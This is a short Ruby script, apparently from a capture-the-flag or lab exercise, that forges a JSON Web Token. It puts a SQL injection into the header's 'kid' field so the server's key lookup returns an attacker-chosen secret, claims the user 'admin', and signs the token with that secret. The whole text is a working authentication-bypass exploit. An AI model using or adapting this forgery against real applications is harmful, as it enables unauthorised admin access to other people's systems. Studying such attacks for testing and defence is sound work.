# generates jwt with SQL injection and signs it with the signature secret putting it back together

require 'openssl'
require 'base64'
require 'json'

secret = "1234"

header = {"typ":"JWT","alg":"HS256","kid":"key1' UNION SELECT '1234"}.to_json

payload = {"user":"admin"}.to_json

token = Base64.strict_encode64(header).gsub("=","")+"."+Base64.strict_encode64(payload).gsub("=","")

puts token

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, token))

puts token+"."+signature
